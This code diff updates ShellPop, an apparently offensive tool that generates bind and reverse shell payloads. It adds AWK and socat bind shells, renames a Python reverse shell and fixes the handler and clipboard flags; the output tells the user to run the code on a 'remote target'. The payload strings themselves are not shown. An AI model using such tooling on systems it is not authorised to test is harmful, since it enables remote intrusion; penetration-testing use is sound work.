@@ -102,7 +102,7 @@ AVAILABLE_SHELLS = [
                 arch="Independent",
                 use_handler=bind_tcp_handler,
                 use_http_stager=LINUX_STAGERS),
-            
+
             8: Shell("Ruby UDP", 
                 "bind",
                 "udp",
@@ -121,7 +121,7 @@ AVAILABLE_SHELLS = [
                 use_handler=bind_tcp_handler,
                 use_http_stager=LINUX_STAGERS),
 
-            10: Shell("Netcat+coproc (OpenBSD) UDP", 
+            10: Shell("Netcat+coproc (OpenBSD) UDP",
                 "bind",
                 "udp",
                 BIND_NETCAT_OPENBSD_UDP(),
@@ -130,7 +130,7 @@ AVAILABLE_SHELLS = [
                 use_handler=None,
                 use_http_stager=LINUX_STAGERS),
 
-            11: Shell("Netcat (Traditional) TCP", 
+            11: Shell("Netcat (Traditional) TCP",
                 "bind",
                 "tcp",
                 BIND_NETCAT_TRADITIONAL_TCP(),
@@ -138,8 +138,26 @@ AVAILABLE_SHELLS = [
                 arch="Independent",
                 use_handler=bind_tcp_handler,
                 use_http_stager=LINUX_STAGERS),
-            
-            12: Shell("Powershell TCP",
+
+            12: Shell("AWK TCP",
+                "bind",
+                "tcp",
+                BIND_AWK_TCP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=bind_tcp_handler,
+                use_http_stager=LINUX_STAGERS),
+
+            13: Shell("socat UDP",
+                "bind",
+                "udp",
+                BIND_SOCAT_UDP(),
+                os="Linux",
+                arch="Independent",
+                use_handler=None,
+                use_http_stager=LINUX_STAGERS),
+
+            14: Shell("Powershell TCP",
                 "bind",
                 "tcp",
                 BIND_POWERSHELL_TCP(),
@@ -151,7 +169,7 @@ AVAILABLE_SHELLS = [
 
         # Reverse shell list
         {
-            1: Shell("Python TCP", 
+            1: Shell("Python TCP +pty",
                 "reverse",
                 "tcp",
                 REV_PYTHON_TCP(),
@@ -169,7 +187,7 @@ AVAILABLE_SHELLS = [
                 use_handler=None,
                 use_http_stager=LINUX_STAGERS),
 
-            3: Shell("PHP TCP", 
+            3: Shell("PHP TCP",
                 "reverse",
                 "tcp",
                 REV_PHP_TCP(),
@@ -429,7 +447,7 @@ def main():
     parser.add_argument("--urlencode", action="store_true", required=False, help="Encode the command in URL encoding.")
 
     # Use handler if possible.
-    parser.add_argument("--handler", action="store_true", help="Use handler, if possible.", required=False)
+    parser.add_argument("--handler", action="store_true", help="Use handler, if possible.", default=False, required=False)
 
     # Use staging
     parser.add_argument("--stager", type=str, help="Use HTTP staging for malicious shells", required=False)
@@ -438,7 +456,7 @@ def main():
     parser.add_argument("--http-port", type=int, help="HTTP staging port to be used", required=False)
 
     # Send it to clipboard
-    parser.add_argument("--clip", action="store_true", help="Copy payload to your clipboard automatically.", required=False)
+    parser.add_argument("--clip", action="store_true", help="Copy payload to your clipboard automatically.", default=False, required=False)
 
     args = parser.parse_args()
     if args.list == True:
@@ -482,8 +500,8 @@ def main():
             print(error("Error: You need to set the remote port number to listen with --port"))
             exit(1)
         shell = select_shell(args, "bind", args.number)
-        if shell.handler is not None:
-            if args.host is  None:
+        if args.handler is not False:
+            if args.host is None:
                 args.host = raw_input("[\033[092m*\033[0m] Remote host IP address: ")
             shell.handler_args = (args.host, args.port)
 
@@ -538,7 +556,7 @@ def main():
 
     if args.clip is True:
         pyperclip.copy(to_be_executed)
-    print(info("ShellPop code has been copied to clipboard."))
+        print(info("ShellPop code has been copied to clipboard."))
 
     print(info("Execute this code in remote target: \n\n{0}\n".format(to_be_executed)))
     
